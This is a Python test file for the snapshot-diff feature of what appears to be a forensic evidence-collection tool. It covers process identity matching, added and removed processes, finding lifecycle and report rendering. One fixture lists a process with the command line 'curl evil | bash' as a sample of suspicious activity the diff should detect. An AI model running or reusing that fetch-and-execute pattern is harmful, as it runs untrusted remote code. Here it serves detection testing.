"""Case diff: identity matching, change detection, finding diff, render."""

from __future__ import annotations

import json
from pathlib import Path

from digger.core import Artifact, EvidenceStore, Finding
from digger.diff import (
    DiffEngine, compute_diff,
    render_diff_html, render_diff_json, render_diff_markdown,
)


def _seed(store: EvidenceStore, processes: list[dict], findings: list[dict] | None = None) -> None:
    store.set_meta("case_id", processes[0].get("_case_id", "case-x"))
    store.set_meta("host", {"node": "demo", "machine": "arm64"})
    for p in processes:
        data = {k: v for k, v in p.items() if not k.startswith("_")}
        store.add_artifact(Artifact(
            collector="processes", category="process",
            subject=f"pid={data.get('pid')} {data.get('name')}",
            data=data,
        ))
    for f in findings or []:
        store.add_finding(Finding(**f))


def test_no_changes_yields_empty_diff(tmp_path: Path):
    a, b = tmp_path / "a", tmp_path / "b"
    sa, sb = EvidenceStore(a), EvidenceStore(b)
    _seed(sa, [{"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"}])
    _seed(sb, [{"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"}])
    sa.close(); sb.close()
    result = compute_diff(a, b)
    s = result.summary()
    assert s["artifact_added"] == 0
    assert s["artifact_removed"] == 0
    assert s["artifact_modified"] == 0


def test_volatile_pid_ignored_by_identity(tmp_path: Path):
    """Same process, different pid → must NOT appear as a change."""
    a, b = tmp_path / "a", tmp_path / "b"
    sa, sb = EvidenceStore(a), EvidenceStore(b)
    proc = lambda pid: {"pid": pid, "name": "Chrome", "exe": "/Apps/Chrome",
                        "cmdline": ["/Apps/Chrome", "--type=gpu"], "username": "alice"}
    _seed(sa, [proc(101)])
    _seed(sb, [proc(202)])
    sa.close(); sb.close()
    s = compute_diff(a, b).summary()
    assert s["artifact_added"] == 0
    assert s["artifact_modified"] == 0


def test_new_process_detected(tmp_path: Path):
    a, b = tmp_path / "a", tmp_path / "b"
    sa, sb = EvidenceStore(a), EvidenceStore(b)
    _seed(sa, [{"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"}])
    _seed(sb, [
        {"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"},
        {"pid": 99, "name": "bash", "exe": "/bin/bash",
         "cmdline": ["/bin/bash", "-c", "curl evil | bash"], "username": "alice"},
    ])
    sa.close(); sb.close()
    result = compute_diff(a, b)
    s = result.summary()
    assert s["artifact_added"] == 1
    proc_diff = next(d for d in result.artifact_diffs if d.collector == "processes")
    assert any("bash" in art["subject"] for art in proc_diff.added)


def test_removed_process_detected(tmp_path: Path):
    a, b = tmp_path / "a", tmp_path / "b"
    sa, sb = EvidenceStore(a), EvidenceStore(b)
    _seed(sa, [
        {"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"},
        {"pid": 50, "name": "sshd", "exe": "/usr/sbin/sshd", "cmdline": ["sshd"], "username": "root"},
    ])
    _seed(sb, [
        {"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"},
    ])
    sa.close(); sb.close()
    s = compute_diff(a, b).summary()
    assert s["artifact_removed"] == 1


def test_finding_lifecycle(tmp_path: Path):
    a, b = tmp_path / "a", tmp_path / "b"
    sa, sb = EvidenceStore(a), EvidenceStore(b)
    _seed(sa,
          [{"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"}],
          findings=[
              {"detector": "x", "severity": "high", "title": "old issue", "summary": "x"},
              {"detector": "x", "severity": "medium", "title": "persists", "summary": "p"},
          ])
    _seed(sb,
          [{"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"}],
          findings=[
              {"detector": "x", "severity": "medium", "title": "persists", "summary": "p"},
              {"detector": "x", "severity": "critical", "title": "fresh threat", "summary": "f"},
          ])
    sa.close(); sb.close()
    result = compute_diff(a, b)
    new_titles = {f["title"] for f in result.findings.new}
    resolved_titles = {f["title"] for f in result.findings.resolved}
    persisted_titles = {f["title"] for f in result.findings.persisted}
    assert "fresh threat" in new_titles
    assert "old issue" in resolved_titles
    assert "persists" in persisted_titles


def test_renderers_emit_non_empty(tmp_path: Path):
    a, b = tmp_path / "a", tmp_path / "b"
    sa, sb = EvidenceStore(a), EvidenceStore(b)
    _seed(sa, [{"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"}])
    _seed(sb, [
        {"pid": 1, "name": "init", "exe": "/sbin/init", "cmdline": ["init"], "username": "root"},
        {"pid": 99, "name": "bash", "exe": "/bin/bash", "cmdline": ["bash", "-c", "evil"], "username": "alice"},
    ])
    sa.close(); sb.close()
    result = compute_diff(a, b)
    parsed = json.loads(render_diff_json(result))
    assert parsed["summary"]["artifact_added"] == 1
    md = render_diff_markdown(result)
    assert "bash" in md
    html = render_diff_html(result)
    assert "bash" in html
    assert "<svg" in html
